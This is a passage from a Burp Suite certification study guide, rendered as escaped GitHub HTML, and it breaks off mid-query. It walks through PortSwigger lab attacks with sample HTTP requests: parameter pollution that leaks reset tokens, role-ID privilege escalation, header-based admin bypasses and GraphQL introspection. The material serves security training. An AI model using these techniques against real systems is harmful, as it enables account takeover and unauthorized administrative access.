message leaking information of positive result.\nURL encode the random parameter and add it to current POST body parameters:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"username=administrator%26x=y\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eusername=administrator%26x=y\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eURL Encode Character Table\u003c/h4\u003e\u003ca id=\"user-content-url-encode-character-table\" class=\"anchor\" aria-label=\"Permalink: URL Encode Character Table\" href=\"#url-encode-character-table\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e%3F\u003c/code\u003e - \u003ccode\u003e?\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%3E\u003c/code\u003e - \u003ccode\u003e\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%3D\u003c/code\u003e - \u003ccode\u003e=\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%3C\u003c/code\u003e - \u003ccode\u003e\u0026lt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%3B\u003c/code\u003e - \u003ccode\u003e;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%2C\u003c/code\u003e - ','\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%28\u003c/code\u003e - \u003ccode\u003e(\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%29\u003c/code\u003e - \u003ccode\u003e)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%27\u003c/code\u003e - \u003ccode\u003e'\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%26\u003c/code\u003e - \u003ccode\u003e\u0026amp;\u003c/code\u003e \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/delimiters.txt\"\u003edelimiter\u003c/a\u003e between different parameters\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%25\u003c/code\u003e - \u003ccode\u003e%\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%24\u003c/code\u003e - \u003ccode\u003e$\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%23\u003c/code\u003e - \u003ccode\u003e#\u003c/code\u003e fragment identifier\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%22\u003c/code\u003e - \u003ccode\u003e\"\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%2F\u003c/code\u003e - \u003ccode\u003e/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e%27\u003c/code\u003e - back tick\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBased on the response there is possible second parameter named \u003ccode\u003efield\u003c/code\u003e and reviewing the JavaScript source code there is \u003ccode\u003ereset_token\u003c/code\u003e parameter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/api-code-review-forgetpassword.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/api-code-review-forgetpassword.png\" alt=\"api-code-review-forgetpassword\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdding the additional parameter \u003ccode\u003efield\u003c/code\u003e with variable \u003ccode\u003ereset_token\u003c/code\u003e in the POST request, leak the senitive information to reset password token.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/api-resetpassword-leak-token.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/api-resetpassword-leak-token.png\" alt=\"api-resetpassword-leak-token\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBrowsing to the target URL and adding the stolen reset token, and change the \u003ccode\u003eadministrator\u003c/code\u003e or \u003ccode\u003ecarlos\u003c/code\u003e user password to gain access.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting server-side parameter pollution in a query string\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eAccess Control\u003c/h2\u003e\u003ca id=\"user-content-access-control\" class=\"anchor\" aria-label=\"Permalink: Access Control\" href=\"#access-control\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#privesc-json-roleid\"\u003eJSON roleid PrivEsc\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#original-url\"\u003eOriginal URL\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#drop-select-a-role\"\u003eDrop Select a role\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#trace-to-admin\"\u003eTrace to Admin\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/botesjuan/cpts-quick-references/blob/main/module/Web-Attacks.md#idor\"\u003eHTB requested I remove my write-up for CPTS Skills assessments - IDOR\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePrivEsc JSON RoleId\u003c/h3\u003e\u003ca id=\"user-content-privesc-json-roleid\" class=\"anchor\" aria-label=\"Permalink: PrivEsc JSON RoleId\" href=\"#privesc-json-roleid\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAccess control to the admin interface is based on user roles, and this can lead to privilege escalation or access control (IDOR) security vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCapture current logged in user email change email submission request and send to \u003cstrong\u003eIntruder\u003c/strong\u003e, then add \u003ccode\u003e\"roleid\":32\u003c/code\u003e into the JSON body of the request, and fuzz the possible \u003ccode\u003eroleid\u003c/code\u003e value for administrator access role.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST /my-account/change-email HTTP/1.1\nHost: TARGET.net\nCookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW\nContent-Length: 48\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\nConnection: close\n\n{\n \u0026quot;csrf\u0026quot;:\u0026quot;u4e8f4kc84md743ka04lfos84\u0026quot;,\n \u0026quot;email\u0026quot;:\u0026quot;carlos@server.net\u0026quot;,\n \u0026quot;roleid\u0026quot;: 42\n}\"\u003e\u003cpre\u003ePOST /my-account/change-email HTTP/1.1\nHost: TARGET.net\nCookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW\nContent-Length: 48\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\nConnection: close\n\n{\n \"csrf\":\"u4e8f4kc84md743ka04lfos84\",\n \"email\":\"carlos@server.net\",\n \"roleid\": 42\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe Hitchhiker's Guide to the Galaxy answer was \u003ca href=\"https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#42_Puzzle\" rel=\"nofollow\"\u003e42\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/intruder-payload-positions.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/intruder-payload-positions.png\" alt=\"Intruder Payload set to identify Admin role ID\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAttacker \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administrator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-roleid-privesc.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-roleid-privesc.png\" alt=\"Attack identify Admin role ID\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile\" rel=\"nofollow\"\u003ePortSwigger Lab: User role can be modified in user profile\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSee \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#exploiting-a-mass-assignment\"\u003eAPI Mass assignment lab exercises\u003c/a\u003e to alter JSON values by inserting additional fields in JSON POST data.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDrop Select a role\u003c/h3\u003e\u003ca id=\"user-content-drop-select-a-role\" class=\"anchor\" aria-label=\"Permalink: Drop Select a role\" href=\"#drop-select-a-role\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eEscalation to administrator is sometimes controlled by a role selector GET request, by \u003cstrong\u003edropping\u003c/strong\u003e the \u003ccode\u003ePlease select a role\u003c/code\u003e GET request before it is presented to the user, the default role of \u003cstrong\u003eadmin\u003c/strong\u003e is selected by back-end and access is granted to the admin portal.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/select-a-role.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/select-a-role.png\" alt=\"Select a role\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine\" rel=\"nofollow\"\u003ePortSwigger Lab: Authentication bypass via flawed state machine\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eOriginal URL\u003c/h3\u003e\u003ca id=\"user-content-original-url\" class=\"anchor\" aria-label=\"Permalink: Original URL\" href=\"#original-url\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdmin portal only accessible from internal. \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e if access control can be bypassed using header \u003ccode\u003eX-Original-URL\u003c/code\u003e, observe different response to \u003ccode\u003e/admin\u003c/code\u003e endpoint requests depending on header value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"X-Original-URL: /admin\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eX-Original-URL: /admin\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/x-original-url.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/x-original-url.png\" alt=\"x-original-url\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented\" rel=\"nofollow\"\u003ePortSwigger Lab: URL-based access control can be circumvented\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eTrace to Admin\u003c/h3\u003e\u003ca id=\"user-content-trace-to-admin\" class=\"anchor\" aria-label=\"Permalink: Trace to Admin\" href=\"#trace-to-admin\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUnable to reach \u003ccode\u003e/admin\u003c/code\u003e portal, but when changing the GET request to \u003ccode\u003eTRACE /admin\u003c/code\u003e this response contain an \u003ccode\u003eX-Custom-IP-Authorization: \u003c/code\u003e header.\u003cbr\u003e\nUse the \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e header to by access control to the admin authentication.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/trace-info.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/trace-info.png\" alt=\"trace info\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /admin HTTP/2\nHost: TARGET.net\nX-Custom-Ip-Authorization: 127.0.0.1\nCookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /admin HTTP/2\nHost: TARGET.net\nX-Custom-Ip-Authorization: 127.0.0.1\nCookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass\" rel=\"nofollow\"\u003ePortSwigger Lab: Authentication bypass via information disclosure\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eGraphQL API\u003c/h2\u003e\u003ca id=\"user-content-graphql-api\" class=\"anchor\" aria-label=\"Permalink: GraphQL API\" href=\"#graphql-api\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#identify-graphql-api\"\u003eIdentify GraphQL API\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#graphql-reveal-creds\"\u003eGraphQL Reveal Credentials\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#graphql-brute-force\"\u003eGraphQL Brute Force\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#graphql-voyager\"\u003eGraphQL Voyager Visualize attack paths\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIdentify GraphQL API\u003c/h3\u003e\u003ca id=\"user-content-identify-graphql-api\" class=\"anchor\" aria-label=\"Permalink: Identify GraphQL API\" href=\"#identify-graphql-api\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTo \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e if there is hidden GraphQL API endpoint send an invalid GET request endpoint and observe message \u003ccode\u003eNot Found\u003c/code\u003e, but when sending \u003ccode\u003e/api\u003c/code\u003e the response is \u003ccode\u003eQuery not present\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-api-identify.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-api-identify.png\" alt=\"graphql API identify\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eEnumeration of the GraphQL API endpoint require testing with a universal query.\u003cbr\u003e\nModify GET request with query as a URL parameter \u003ccode\u003e/api?query=query{__typename}\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe below response validate the \u003cem\u003e\u003cstrong\u003eidentity\u003c/strong\u003e\u003c/em\u003e of GraphQL endpoint:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{\n  \u0026quot;data\u0026quot;: {\n\t\u0026quot;__typename\u0026quot;: \u0026quot;query\u0026quot;\n  }\n}\"\u003e\u003cpre\u003e{\n  \u003cspan class=\"pl-ent\"\u003e\"data\"\u003c/span\u003e: {\n\t\u003cspan class=\"pl-ent\"\u003e\"__typename\"\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003equery\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n  }\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCheck introspection, with new request URL-encoded introspection query as a query parameter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0